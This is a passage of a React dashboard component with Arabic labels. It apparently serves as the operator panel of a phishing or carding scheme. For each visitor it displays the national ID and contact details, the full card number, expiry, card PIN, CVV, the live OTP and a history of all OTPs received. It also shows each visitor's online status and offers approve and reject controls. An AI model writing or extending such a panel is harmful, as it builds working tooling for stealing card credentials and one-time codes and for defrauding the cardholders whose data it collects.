      await batch.commit()
      setNotifications((prev) => prev.map((n) => ({ ...n, isHidden: true })))
      toast({
        title: "تم مسح جميع الإشعارات المرئية",
        description: "تم إخفاء جميع الإشعارات من القائمة.",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({ title: "خطأ", description: "حدث خطأ أثناء مسح الإشعارات.", variant: "destructive" })
    } finally {
      setIsLoading(false)
    }
  }

  const handleApproval = async (state: "approved" | "rejected", id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, { status: state })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: `تم تحديث حالة الإشعار بنجاح.`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({ title: "خطأ", description: "حدث خطأ أثناء تحديث حالة الإشعار.", variant: "destructive" })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({ title: "خطأ في تسجيل الخروج", description: "حدث خطأ أثناء محاولة تسجيل الخروج.", variant: "destructive" })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, flagColor: color } : n)))
      toast({
        title: "تم تحديث العلامة",
        description: color
          ? `تم تعيين العلامة ${color === "red" ? "الحمراء" : color === "yellow" ? "الصفراء" : "الخضراء"}.`
          : "تمت إزالة العلامة.",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({ title: "خطأ", description: "حدث خطأ أثناء تحديث لون العلامة.", variant: "destructive" })
    }
  }

  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return "bg-card hover:bg-muted/50"
    const colorMap = {
      red: "bg-red-50 dark:bg-red-900/20 hover:bg-red-100 dark:hover:bg-red-900/30",
      yellow: "bg-yellow-50 dark:bg-yellow-900/20 hover:bg-yellow-100 dark:hover:bg-yellow-900/30",
      green: "bg-green-50 dark:bg-green-900/20 hover:bg-green-100 dark:hover:bg-green-900/30",
    }
    return colorMap[flagColor]
  }

  // This early return is now safe as all hooks are above it
  if (isLoading && notifications.length === 0) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center w-full">
        <div className="flex flex-col items-center gap-4">
          <Loader2 className="h-12 w-12 animate-spin text-primary" />
          <p className="text-lg font-medium text-muted-foreground">جاري تحميل البيانات...</p>
        </div>
      </div>
    )
  }

  const cardCount = notifications.filter((n) => !n.isHidden && !!n.cardNumber).length
  const onlineCountFiltered = filteredNotifications.filter((n) => onlineStatuses[n.id]).length

  // mainContent definition and return JSX remain the same
  // ...
  // Ensure the mainContent variable is defined before it's used in the return statement.
  // It was defined in the previous version, so assuming it's still there.
  // For brevity, I'm not re-pasting the entire JSX return if it's unchanged.

  const mainContent = (
    <>
      {/* Statistics Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 md:gap-6 mb-6 md:mb-8">
        {statistics.map((stat, index) => (
          <Card
            key={stat.title}
            className="relative overflow-hidden shadow-lg hover:shadow-xl transition-all duration-300 border-0"
          >
            <div
              className={`absolute inset-0 bg-gradient-to-br ${
                index === 0
                  ? "from-blue-500/10 via-blue-400/5 to-transparent"
                  : index === 1
                    ? "from-emerald-500/10 via-emerald-400/5 to-transparent"
                    : "from-purple-500/10 via-purple-400/5 to-transparent"
              }`}
            />
            <CardHeader className="pb-2 flex flex-row items-center justify-between space-y-0 relative z-10">
              <CardTitle className="text-sm font-medium text-muted-foreground">{stat.title}</CardTitle>
              <div
                className={`p-2 rounded-xl ${
                  index === 0
                    ? "bg-blue-500/20 text-blue-600 dark:text-blue-400"
                    : index === 1
                      ? "bg-emerald-500/20 text-emerald-600 dark:text-emerald-400"
                      : "bg-purple-500/20 text-purple-600 dark:text-purple-400"
                }`}
              >
                <stat.icon className="h-5 w-5" />
              </div>
            </CardHeader>
            <CardContent className="relative z-10">
              <div className="text-3xl font-bold text-foreground mb-1">{stat.value}</div>
              <p className="text-xs text-muted-foreground">{stat.comparison} من الإجمالي</p>
            </CardContent>
            <CardFooter className="pt-1 pb-3 relative z-10">
              <MiniChart
                data={stat.trend}
                colorClassName={
                  index === 0
                    ? "bg-gradient-to-t from-blue-500 to-blue-400"
                    : index === 1
                      ? "bg-gradient-to-t from-emerald-500 to-emerald-400"
                      : "bg-gradient-to-t from-purple-500 to-purple-400"
                }
              />
            </CardFooter>
          </Card>
        ))}
      </div>

      <Tabs defaultValue="notifications" className="w-full">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-4 gap-4">
          <TabsList>
            <TabsTrigger value="notifications" className="flex items-center gap-2 px-4 py-2">
              <Bell className="h-4 w-4" /> الإشعارات
            </TabsTrigger>
            <TabsTrigger value="insights" className="flex items-center gap-2 px-4 py-2">
              <BarChartHorizontalBig className="h-4 w-4" /> رؤى سريعة
            </TabsTrigger>
          </TabsList>
          <div className="w-full sm:w-auto">
            <SearchBar onSearch={setSearchTerm} initialTerm={searchTerm} />
          </div>
        </div>

        <TabsContent value="notifications" className="space-y-6 mt-0">
          <div className="flex flex-col sm:flex-row items-center gap-2 mb-4">
            <div className="flex gap-2 flex-wrap">
              {[
                { label: "الكل", type: "all", count: filteredNotifications.length, icon: Users, color: "blue" },
                { label: "البطاقات", type: "card", count: cardCount, icon: CreditCard, color: "emerald" },
                { label: "المتصلين", type: "online", count: onlineCountFiltered, icon: UserCheck, color: "purple" },
              ].map((filter) => (
                <Button
                  key={filter.type}
                  variant={filterType === filter.type ? "default" : "outline"}
                  onClick={() => setFilterType(filter.type as any)}
                  size="sm"
                  className={`flex items-center gap-1.5 transition-all duration-200 ${
                    filterType === filter.type
                      ? `bg-gradient-to-r ${
                          filter.color === "blue"
                            ? "from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700"
                            : filter.color === "emerald"
                              ? "from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700"
                              : "from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700"
                        } text-white border-0 shadow-lg`
                      : "hover:bg-muted/80 hover:border-primary/30"
                  }`}
                >
                  <filter.icon className="h-4 w-4" />
                  {filter.label}
                  <Badge
                    variant={filterType === filter.type ? "secondary" : "outline"}
                    className={`px-1.5 text-xs ${
                      filterType === filter.type ? "bg-white/20 text-white border-white/30" : ""
                    }`}
                  >
                    {filter.count}
                  </Badge>
                </Button>
              ))}
            </div>
          </div>

          <Card className="shadow-xl overflow-hidden border-0 bg-gradient-to-br from-card via-card to-card/95">
            <CardHeader className="px-4 py-4 border-b bg-gradient-to-r from-muted/50 via-muted/30 to-muted/50 flex flex-row items-center justify-between">
              <CardTitle className="text-base font-semibold flex items-center gap-2">
                <div className="p-1.5 rounded-lg bg-primary/20">
                  <FileText className="h-4 w-4 text-primary" />
                </div>
                قائمة الإشعارات
                {searchTerm && (
                  <Badge variant="secondary" className="text-xs bg-primary/10 text-primary border-primary/20">
                    نتائج البحث: {filteredNotifications.length}
                  </Badge>
                )}
              </CardTitle>
              <div className="flex items-center gap-2">
                <DropdownMenu>
                  <DropdownMenuTrigger asChild>
                    <Button variant="outline" size="sm" className="h-8 gap-1">
                      <ArrowUpDown className="h-3.5 w-3.5" />
                      <span className="sr-only sm:not-sr-only">ترتيب</span>
                    </Button>
                  </DropdownMenuTrigger>
                  <DropdownMenuContent align="end" className="w-48">
                    <DropdownMenuItem>الأحدث أولاً</DropdownMenuItem>
                    <DropdownMenuItem>الأقدم أولاً</DropdownMenuItem>
                    <DropdownMenuSeparator />
                    <DropdownMenuItem>حسب الدولة</DropdownMenuItem>
                    <DropdownMenuItem>حسب الحالة</DropdownMenuItem>
                  </DropdownMenuContent>
                </DropdownMenu>
              </div>
            </CardHeader>

            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="bg-muted/50 hover:bg-muted/60">
                    <TableHead className="px-4 py-3 w-[150px]">الدولة</TableHead>
                    <TableHead className="px-4 py-3">المعلومات</TableHead>
                    <TableHead className="px-4 py-3">حالة البطاقة</TableHead>
                    <TableHead className="px-4 py-3">الوقت</TableHead>
                    <TableHead className="px-4 py-3 text-center">الحالة</TableHead>
                    <TableHead className="px-4 py-3 text-center">كود OTP</TableHead>
                    <TableHead className="px-4 py-3 text-center w-[180px]">الإجراءات</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {paginatedNotifications.length > 0 ? (
                    paginatedNotifications.map((notification) => (
                      <TableRow
                        key={notification.id}
                        className={`${getRowBackgroundColor(notification.flagColor)} transition-colors duration-150`}
                      >
                        <TableCell className="px-4 py-3 font-medium">
                          <div className="flex items-center gap-2">
                            <MapPin className="h-4 w-4 text-muted-foreground" />
                            {notification.country || "غير معروف"}
                          </div>
                        </TableCell>
                        <TableCell className="px-4 py-3">
                          <div className="flex flex-wrap gap-1.5">
                            <Button
                              variant="link"
                              size="sm"
                              className="p-0 h-auto text-xs"
                              onClick={() => handleInfoClick(notification, "personal")}
                            >
                              {notification.name ||
                              notification.phone ||
                              notification.email ||
                              notification.idNumber ? (
                                "معلومات شخصية"
                              ) : (
                                <span className="text-muted-foreground">لا يوجد شخصي</span>
                              )}
                            </Button>
                            <Button
                              variant={'outline'}
                              size="sm"
                              className={`p-0 h-auto text-xs ${notification.cardNumber ? "bg-green-400 p-1" : ""}`}
                              onClick={() => handleInfoClick(notification, "card")}
                            >
                              {notification.cardNumber ? (
                                "معلومات البطاقة"
                              ) : (
                                <span className="text-muted-foreground">لا يوجد بطاقة</span>
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell className="px-4 py-3">
                          {notification.status === "approved" ? (
                            <Badge className="bg-green-100 text-green-700 dark:bg-green-700 dark:text-green-100 border border-green-200 dark:border-green-600">
                              <CheckCircle className="h-3 w-3 mr-1 rtl:ml-1 rtl:mr-0" />
                              موافق
                            </Badge>
                          ) : notification.status === "rejected" ? (
                            <Badge className="bg-red-100 text-red-700 dark:bg-red-700 dark:text-red-100 border border-red-200 dark:border-red-600">
                              <XCircle className="h-3 w-3 mr-1 rtl:ml-1 rtl:mr-0" />
                              مرفوض
                            </Badge>
                          ) : (
                            <Badge
                              variant="outline"
                              className="bg-yellow-100 text-yellow-700 dark:bg-yellow-700 dark:text-yellow-100 border border-yellow-200 dark:border-yellow-600"
                            >
                              <Clock className="h-3 w-3 mr-1 rtl:ml-1 rtl:mr-0" />
                              معلق
                            </Badge>
                          )}
                        </TableCell>
                        <TableCell className="px-4 py-3 text-xs text-muted-foreground whitespace-nowrap">
                          {notification.createdDate &&
                            formatDistanceToNow(new Date(notification.createdDate), { addSuffix: true, locale: ar })}
                        </TableCell>
                        <TableCell className="px-4 py-3 text-center">
                          <UserStatus userId={notification.id} />
                        </TableCell>
                        <TableCell className="px-4 py-3 text-center">
                          {(notification.otp || notification.otpCode) && (
                            <Badge variant="outline" className="font-mono text-xs">
                              {notification.otp || notification.otpCode}
                            </Badge>
                          )}
                        </TableCell>
                        <TableCell className="px-4 py-3">
                          <div className="flex justify-center items-center gap-1">
                            <TooltipProvider delayDuration={100}>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <Button
                                    variant="ghost"
                                    size="icon"
                                    className="h-8 w-8 text-green-600 hover:bg-green-100 hover:text-green-700 dark:text-green-400 dark:hover:bg-green-700 dark:hover:text-green-300"
                                    onClick={() => handleApproval("approved", notification.id)}
                                    disabled={notification.status === "approved"}
                                  >
                                    <CheckCircle className="h-4 w-4" />
                                  </Button>
                                </TooltipTrigger>
                                <TooltipContent>
                                  <p>قبول</p>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>
                            <TooltipProvider delayDuration={100}>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <Button
                                    variant="ghost"
                                    size="icon"
                                    className="h-8 w-8 text-red-600 hover:bg-red-100 hover:text-red-700 dark:text-red-400 dark:hover:bg-red-700 dark:hover:text-red-300"
                                    onClick={() => handleApproval("rejected", notification.id)}
                                    disabled={notification.status === "rejected"}
                                  >
                                    <XCircle className="h-4 w-4" />
                                  </Button>
                                </TooltipTrigger>
                                <TooltipContent>
                                  <p>رفض</p>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>
                            <FlagColorSelector
                              notificationId={notification.id}
                              currentColor={notification.flagColor || null}
                              onColorChange={handleFlagColorChange}
                            />
                            <TooltipProvider delayDuration={100}>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <Button
                                    variant="ghost"
                                    size="icon"
                                    className="h-8 w-8 text-muted-foreground hover:bg-muted hover:text-destructive"
                                    onClick={() => handleHide(notification.id)}
                                  >
                                    <EyeOff className="h-4 w-4" />
                                  </Button>
                                </TooltipTrigger>
                                <TooltipContent>
                                  <p>إخفاء</p>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))
                  ) : (
                    <TableRow>
                      <TableCell colSpan={7} className="h-24 text-center text-muted-foreground">
                        <div className="flex flex-col items-center justify-center gap-2">
                          <Bell className="h-8 w-8 text-gray-300 dark:text-gray-700" />
                          <p>لا توجد إشعارات لعرضها حاليًا.</p>
                          {searchTerm && <p className="text-xs">حاول تعديل مصطلحات البحث أو الفلاتر.</p>}
                        </div>
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </div>
            {totalPages > 1 && (
              <CardFooter className="px-4 py-3 border-t">
                <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} />
              </CardFooter>
            )}
          </Card>
        </TabsContent>

        <TabsContent value="insights" className="space-y-6 mt-0">
          <div className="grid md:grid-cols-2 gap-6">
            <Card className="shadow-md">
              <CardHeader>
                <CardTitle className="text-base font-semibold flex items-center gap-2">
                  <Calendar className="h-5 w-5 text-primary" /> آخر النشاطات
                </CardTitle>
                <CardDescription>آخر 5 نشاطات مسجلة في النظام.</CardDescription>
              </CardHeader>
              <CardContent>
                <ActivityTimeline notifications={notifications.filter((n) => !n.isHidden)} />
              </CardContent>
            </Card>
            <Card className="shadow-md">
              <CardHeader>
                <CardTitle className="text-base font-semibold flex items-center gap-2">
                  <Palette className="h-5 w-5 text-primary" /> إجراءات سريعة
                </CardTitle>
                <CardDescription>أدوات وإعدادات للوصول السريع.</CardDescription>
              </CardHeader>
              <CardContent className="space-y-3">
                {[
                  {
                    label: "تصدير البيانات",
                    icon: Download,
                    action: () => setExportDialogOpen(true),
                    variant: "outline",
                  },
                  {
                    label: "إعدادات لوحة التحكم",
                    icon: Settings,
                    action: () => setSettingsOpen(true),
                    variant: "outline",
                  },
                  {
                    label: "مسح جميع الإشعارات المرئية",
                    icon: Trash2,
                    action: handleClearAllVisible,
                    variant: "destructive",
                    disabled: notifications.filter((n) => !n.isHidden).length === 0,
                  },
                ].map((item) => (
                  <Button
                    key={item.label}
                    variant={item.variant as any}
                    className="w-full justify-start gap-2"
                    onClick={item.action}
                    disabled={item.disabled}
                  >
                    <item.icon className="h-4 w-4" /> {item.label}
                  </Button>
                ))}
              </CardContent>
            </Card>
          </div>
        </TabsContent>
      </Tabs>
    </>
  )

  return (
    <div dir="rtl" className="min-h-screen bg-muted/40 text-foreground">
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[280px] p-0" dir="rtl">
          <SheetHeader className="p-6 pb-4 border-b">
            <SheetTitle className="flex items-center gap-2 text-lg">
              <Bell className="h-5 w-5 text-primary" />
              <span>لوحة التحكم</span>
            </SheetTitle>
          </SheetHeader>
          <div className="p-4 space-y-2">
            {[
              { label: "الإشعارات", icon: Bell, action: () => setMobileMenuOpen(false) },
              {
                label: "الإعدادات",
                icon: Settings,
                action: () => {
                  setSettingsOpen(true)
                  setMobileMenuOpen(false)
                },
              },
              {
                label: "تصدير البيانات",
                icon: Download,
                action: () => {
                  setExportDialogOpen(true)
                  setMobileMenuOpen(false)
                },
              },
            ].map((item) => (
              <Button
                key={item.label}
                variant="ghost"
                className="w-full justify-start gap-3 text-sm py-3 h-auto"
                onClick={item.action}
              >
                <item.icon className="h-4 w-4 text-muted-foreground" /> {item.label}
              </Button>
            ))}
            <Separator className="my-2" />
            <Button
              variant="ghost"
              className="w-full justify-start gap-3 text-sm py-3 h-auto text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-900/50"
              onClick={handleLogout}
            >
              <LogOut className="h-4 w-4" /> تسجيل الخروج
            </Button>
          </div>
        </SheetContent>
      </Sheet>

      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />
      <ExportDialog
        open={exportDialogOpen}
        onOpenChange={setExportDialogOpen}
        notificationsCount={filteredNotifications.length}
      />

      <header className="sticky top-0 z-30 border-b bg-gradient-to-r from-background via-background to-background/95 backdrop-blur-xl supports-[backdrop-filter]:bg-background/80 shadow-sm">
        <div className="container mx-auto flex h-16 items-center justify-between px-4 sm:px-6 lg:px-8">
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="icon"
              className="lg:hidden hover:bg-primary/10"
              onClick={() => setMobileMenuOpen(true)}
            >
              <Menu className="h-5 w-5" />
              <span className="sr-only">فتح القائمة</span>
            </Button>
            <div className="flex items-center gap-2">
              <div className="bg-gradient-to-br from-primary to-primary/80 p-2 rounded-xl shadow-lg">
                <Bell className="h-5 w-5 text-primary-foreground" />
              </div>
              <h1 className="text-xl font-bold hidden sm:block bg-gradient-to-r from-foreground to-foreground/80 bg-clip-text">
                لوحة الإشعارات
              </h1>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <div className="hidden lg:flex items-center gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="ghost" size="icon" onClick={() => setSettingsOpen(true)}>
                      <Settings className="h-5 w-5" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>الإعدادات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button variant="ghost" size="icon" onClick={() => setExportDialogOpen(true)}>
                      <Download className="h-5 w-5" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تصدير البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
              <Button
                variant="outline"
                size="sm"
                onClick={handleClearAllVisible}
                disabled={notifications.filter((n) => !n.isHidden).length === 0}
                className="hidden sm:flex items-center gap-2"
              >
                <Trash2 className="h-4 w-4" /> مسح الكل
              </Button>
            </div>
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="ghost" className="relative h-9 w-9 rounded-full">
                  <Avatar className="h-9 w-9 border">
                    <AvatarImage src="/placeholder.svg?height=36&width=36" alt="Admin" />
                    <AvatarFallback>مد</AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56" sideOffset={8}>
                <DropdownMenuLabel className="font-normal">
                  <div className="flex flex-col space-y-1">
                    <p className="text-sm font-medium leading-none">مدير النظام</p>
                    <p className="text-xs leading-none text-muted-foreground">admin@example.com</p>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
                  <Settings className="mr-2 h-4 w-4 rtl:ml-2 rtl:mr-0" />
                  <span>الإعدادات</span>
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
                  <Download className="mr-2 h-4 w-4 rtl:ml-2 rtl:mr-0" />
                  <span>تصدير البيانات</span>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  onClick={handleLogout}
                  className="text-red-500 focus:text-red-600 focus:bg-red-50 dark:focus:bg-red-900/50"
                >
                  <LogOut className="mr-2 h-4 w-4 rtl:ml-2 rtl:mr-0" />
                  <span>تسجيل الخروج</span>
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <main className="container mx-auto p-4 sm:p-6 lg:p-8">
        {isLoading && notifications.length > 0 && (
          <div className="fixed top-16 left-0 right-0 h-1 bg-primary/20 animate-pulse z-40">
            <div className="h-1 bg-primary animate-indeterminate-progress"></div>
          </div>
        )}
        {mainContent}
      </main>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="sm:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-lg">
              {selectedInfo === "personal" ? (
                <>
                  <Users className="h-5 w-5 text-primary" />
                  المعلومات الشخصية
                </>
              ) : (
                <>
                  <CreditCard className="h-5 w-5 text-primary" />
                  معلومات البطاقة
                </>
              )}
            </DialogTitle>
            <DialogDescription>
              تفاصيل {selectedInfo === "personal" ? "المستخدم" : "البطاقة"} المحددة.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3 py-4 max-h-[60vh] overflow-y-auto">
            {selectedNotification &&
              (selectedInfo === "personal" ? (
                <>
                  {[
                    { label: "رقم الهوية", value: selectedNotification.idNumber },
                    { label: "الاسم", value: selectedNotification.name },
                    { label: "البريد الإلكتروني", value: selectedNotification.email },
                    { label: "رقم الجوال", value: selectedNotification.mobile },
                    { label: "الهاتف", value: selectedNotification.phone },
                  ].map(
                    (item) =>
                      item.value && (
                        <div
                          key={item.label}
                          className="flex justify-between items-center py-2.5 border-b last:border-b-0"
                        >
                          <span className="text-sm text-muted-foreground">{item.label}:</span>
                          <span className="text-sm font-medium text-foreground">{item.value}</span>
                        </div>
                      ),
                  )}
                </>
              ) : (
                <>
                  {[
                    { label: "البنك", value: selectedNotification.bank },
                    {
                      label: "رقم البطاقة",
                      value: selectedNotification.cardNumber,
                      prefix: selectedNotification.prefix,
                      isCard: true,
                    },
                    {
                      label: "تاريخ الانتهاء",
                      value:
                        selectedNotification.year && selectedNotification.month
                          ? `${selectedNotification.year}/${selectedNotification.month}`
                          : selectedNotification.cardExpiry,
                    },
                    { label: "رمز البطاقة (Pass)", value: selectedNotification.pass },
                    { label: "رمز الأمان (CVV/CVC)", value: selectedNotification.cvv || selectedNotification.cardCvc },
                    {
                      label: "رمز التحقق (OTP)",
                      value: selectedNotification.otp || selectedNotification.otpCode,
                      isOtp: true,
                    },
                  ].map(
                    (item) =>
                      item.value && (
                        <div
                          key={item.label}
                          className="flex justify-between items-center py-2.5 border-b last:border-b-0"
                        >
                          <span className="text-sm text-muted-foreground">{item.label}:</span>
                          {item.isCard ? (
                            <div className="font-mono text-sm" dir="ltr">
                              {item.prefix && (
                                <Badge variant="outline" className="mr-1">
                                  {item.prefix}
                                </Badge>
                              )}
                              <Badge variant="secondary">{item.value}</Badge>
                            </div>
                          ) : item.isOtp ? (
                            <Badge variant="default" className="font-mono text-sm">
                              {item.value}
                            </Badge>
                          ) : (
                            <span className="text-sm font-medium text-foreground">{item.value}</span>
                          )}
                        </div>
                      ),
                  )}
                  {selectedNotification.allOtps && selectedNotification.allOtps.length > 0 && (
                    <div className="pt-3 border-t">
                      <span className="text-sm text-muted-foreground block mb-1.5">جميع رموز OTP المستلمة:</span>
                      <div className="flex flex-wrap gap-1.5">
                        {selectedNotification.allOtps.map((otp, index) => (
                          <Badge key={index} variant="outline" className="font-mono text-xs">
                            {otp}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                </>
              ))}
            {(!selectedNotification ||
              (selectedInfo === "personal" &&
                !selectedNotification.name &&
                !selectedNotification.phone &&
                !selectedNotification.email &&
                !selectedNotification.idNumber) ||
              (selectedInfo === "card" && !selectedNotification.cardNumber)) && (
              <p className="text-sm text-muted-foreground text-center py-4">لا توجد معلومات لعرضها.</p>
            )}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={closeDialog}>
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
      <style jsx global>{`
        .animate-indeterminate-progress {
          animation: indeterminate-progress 1.5s infinite linear;
        }
        @keyframes indeterminate-progress {
          0% { transform: translateX(-100%) scaleX(0.5); }
          50% { transform: translateX(0) scaleX(0.3); }
          100% { transform: translateX(100%) scaleX(0.5); }
        }
      `}</style>
    </div>
  )
}
